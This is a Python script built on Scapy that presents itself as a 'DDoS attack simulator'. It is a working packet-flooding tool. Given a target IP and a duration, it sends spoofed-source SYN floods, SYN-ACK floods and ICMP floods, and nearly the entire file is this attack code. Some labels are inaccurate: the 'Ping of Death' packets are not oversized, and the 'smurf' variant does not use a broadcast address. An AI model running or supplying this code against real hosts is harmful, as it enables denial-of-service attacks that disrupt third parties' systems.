from scapy.all import *  # Import all modules from Scapy for working with network packets.
import ipaddress  # Import module for IP address validation.
import argparse  # Import module for command-line argument parsing.
import time  # Import module for working with time.
import random  # Import module for generating random numbers.


# Function to generate random IP addresses
def random_ip():
    """
    A function to generate random IP addresses.

    Returns:
        - str: A random IP address in the format "x.x.x.x".
    """
    # Return a random IP address in the format "x.x.x.x"
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"


# Function to simulate a DDoS attack on the given target IP for a specified duration.
def ddos(target_ip, attack_type, duration):
    """
    A function to simulate a DDoS attack on the target IP for a specified duration.

    Parameters:
        - target_ip: The IP address of the target machine to attack. Type: str
        - attack_type: The type of attack to perform (e.g., syn_flood, pod, syn_ack, smurf). Type: str
        - duration: The duration of the attack in seconds. Type: int
    """

    target_port = 12345  # The port to which the attack will be sent.
    end_time = time.time() + duration  # Calculate the end time for the attack.

    # If the attack type is SYN Flood
    if attack_type == "syn_flood":
        while time.time() < end_time:
            fake_ip = random_ip()  # Generate a random source IP address for the attack.
            count = random.randint(1, 100)  # Generate a random number of packets to send in each iteration.
            for _ in range(count):
                src_port = random.randint(1024, 65535)  # Generate a random source port.
                pkt = IP(src=fake_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")  # Create a TCP packet with the SYN flag.
                send(pkt, verbose=0)  # Send the packet without printing output.

    # If the attack type is Ping of Death (PoD)
    elif attack_type == "pod":
        while time.time() < end_time:
            fake_ip = random_ip()  # Generate a random source IP address for the attack.
            count = random.randint(1, 100)  # Generate a random number of packets to send in each iteration.
            for _ in range(count):
                load = 1000  # Payload size for the attack.
                pkt = IP(src=fake_ip, dst=target_ip) / ICMP() / Raw(load="A" * load)  # Create an ICMP packet with a large payload.
                send(pkt, verbose=0)  # Send the packet.

    # If the attack type is SYN-ACK Flood
    elif attack_type == "syn_ack":
        while time.time() < end_time:
            fake_ip = random_ip()  # Generate a random source IP address for the attack.
            count = random.randint(1, 100)  # Generate a random number of packets to send in each iteration.
            for _ in range(count):
                src_port = random.randint(1024, 65535)  # Generate a random source port.
                pkt = IP(src=fake_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")  # Create a TCP packet with SYN and ACK flags.
                send(pkt, verbose=0)  # Send the packet.

    # If the attack type is Smurf Attack
    elif attack_type == "smurf":
        while time.time() < end_time:
            pkt = IP(src=target_ip, dst=target_ip) / ICMP()  # Create an ICMP packet that mimics a response from the victim.
            send(pkt, verbose=0)  # Send the packet.

    # If the attack type is unknown.
    else:
        print(f"Unknown attack type: {attack_type}. Please choose from: syn_flood, pod, syn_ack, smurf.")  # Print an error message.


# Main function that handles command-line arguments and starts the DDoS attack.
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS attack simulator.")  # Create an argument parser.
    parser.add_argument("target_ip", help="Target IP address for the DDoS attack.")  # Argument for the target IP address.
    parser.add_argument("attack_type", help="Type of attack (syn_flood, pod, syn_ack, smurf).")  # Argument for selecting the type of attack.
    parser.add_argument("duration", type=int, help="Duration of the attack in seconds.")  # Argument for the attack duration.

    # Check if the correct number of arguments is provided
    if len(sys.argv) < 4:  # Not enough arguments passed.
        print("Error: Missing required arguments.")  # Print an error message if required arguments are missing.
        parser.print_help()  # Print the help message that describes the expected arguments.
        sys.exit(1)  # Exit the program with a status code of 1 to indicate an error.

    args = parser.parse_args()  # Parse the command-line arguments.

    try:
        ipaddress.ip_address(args.target_ip)  # Validate the provided IP address.
        print(f"Starting attack on {args.target_ip} using {args.attack_type} for {args.duration} seconds.")  # Print a message when the attack starts.
        ddos(args.target_ip, args.attack_type, args.duration)  # Call the function to perform the attack.
        print("Attack finished.")  # Print a message when the attack finishes.
    except ValueError:  # Handle ValueError exception if the IP address is invalid.
        print(f"Invalid IP address: {args.target_ip}. Please provide a valid IP.")  # Print an error message if the IP address is invalid.
